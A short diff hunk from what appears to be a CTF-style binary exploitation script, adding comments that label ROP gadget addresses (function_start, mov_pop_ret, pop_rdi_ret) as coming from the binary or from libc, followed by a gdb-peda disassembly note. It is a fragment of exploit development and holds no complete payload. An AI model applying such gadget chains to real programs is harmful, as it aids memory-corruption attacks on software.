@@ -16,9 +16,9 @@ libc_offset = 0x5b8000
 
 print util.proc.pidof(x)
 
-function_start = 0x4004e6
-mov_pop_ret    = 0x400532
-pop_rdi_ret    = 0x01fc3a
+function_start = 0x4004e6 # from binary
+mov_pop_ret    = 0x400532 # from binary 
+pop_rdi_ret    = 0x01fc3a # from libc
 """
 gdb-peda$ x /3i 0x0400532
    0x400532:    mov    rsp,rbp
